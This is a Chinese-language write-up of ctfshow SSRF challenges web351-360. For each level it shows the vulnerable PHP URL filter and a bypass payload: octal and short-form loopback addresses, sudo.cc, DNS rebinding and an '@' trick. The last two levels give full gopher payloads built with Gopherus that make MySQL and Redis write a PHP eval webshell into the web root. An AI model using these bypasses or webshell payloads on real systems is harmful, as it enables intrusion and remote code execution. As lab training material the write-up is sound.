# CTFSHOW SSRF

**目录**

[TOC]





## web351

POST查看 flag.php即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/7ed1cedd30ef6c1366dc7c15fbb9d823.png" alt="" style="max-height:193px; box-sizing:content-box;" />


## web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
} 
```

我们看看 过滤了 localhost 和 127.0.0.1

并且需要存在http

所以我们传入payload

```cobol
url=http://0177.0.0.1/flag.php
```

这里是 八进制的 127

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
} 
```

过滤了 127.0.0.1

我们可以通过 0 来绕过

payload

```cobol
url=http://0/flag.php
```

## web354  sudo.cc 代表 127

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
} 
```

0 1 127 都被过滤了

这里确实学到了

http://sudo.cc 指向的 就是 127.0.0.1

我们直接使用这个payload

```cobol
http://sudo.cc/flag.php
```

## web355  host长度

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
} 
```

没有过滤 但是 host需要为 小于5

payload

```cobol
url=http://0/flag.php
```

看wp还存在一个解法

```cobol
http://127.1/flag.php
```

## web356

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

长度小于3

这里只能使用

```cobol
http://0/flag.php
```

## web357 DNS 重定向

我们这里首先会判断 是不是 私有ip

这样 我们之前的数字ip bypass就是失效了

这里我们可以使用DNS 重定向 bypass

 [rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html) 



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc2457cfd18b8140d17492867f4c95be.png" alt="" style="max-height:220px; box-sizing:content-box;" />


这里设置一个不是私有的ip

```cobol
url=http://7f000001.774bd96d.rbndr.us/flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4065494186b3109806e3dd76a1f69c46.png" alt="" style="max-height:386px; box-sizing:content-box;" />


## web358 @bypass

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

这里需要出现 这内容 才会输出

我们来看看

我们通过 @ 来绕过

```cobol
http://ctf.@127.0.0.1/flag.php?show
```

这里 @ 后 还是解析为 127.0.0.1 并且结尾是 show

## web359  mysql ssrf

首先开局一个登录

我们看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/5508bb6cd76825ac1c4ce101a0cc4744.png" alt="" style="max-height:523px; box-sizing:content-box;" />


发现有一个hidden元素 这里是被隐藏了 并且值已经设定为 url 了 这里要敏感了 因为 SSRF 就是引用其他url

我们随便写一个抓包看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/6cbb748c20713834ad5003112b254b36.png" alt="" style="max-height:307px; box-sizing:content-box;" />


发现 POST内容中 传递了 returl值

我们修改为百度看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/e9c1df0b683d40e76fed085fb7a98342.png" alt="" style="max-height:582px; box-sizing:content-box;" />


确实存在 ssrf

没有找到 flag.php

我们因为通过登入 我们可以想到数据库 那我们直接通过 gopher 攻击mysql即可

我们使用工具

```sql
py2 .\gopherus.py --exploit mysql
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ccdfec5cc7a48d59997158e1fc2d5d6f.png" alt="" style="max-height:271px; box-sizing:content-box;" />


将 payload 再进行一次 url编码

```cobol
gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254f%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
```

然后进行传递



<img src="https://i-blog.csdnimg.cn/blog_migrate/964bc9188d7a5e4c157eb1245c60fcf2.png" alt="" style="max-height:706px; box-sizing:content-box;" />


然后通过蚁剑链接即可

## web360

找不到 flag.php

我们开始通过 dict 探测端口

```cobol
url=dict://127.0.0.1:80
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7dffae7fde9b36330043d62c2ca1c971.png" alt="" style="max-height:205px; box-sizing:content-box;" />


发现开放了 6379端口 这里是redis的端口 这里很明显就是让我们攻击了

我们一样去 工具实现攻击



<img src="https://i-blog.csdnimg.cn/blog_migrate/fe88278e9d3e903d19d9aa8f0991a590.png" alt="" style="max-height:274px; box-sizing:content-box;" />


```cobol
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2540%2524_POST%255Bcmd%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```



总的来说 show的ssrf 还挺简单的 这里学到了 sudo.cc的内容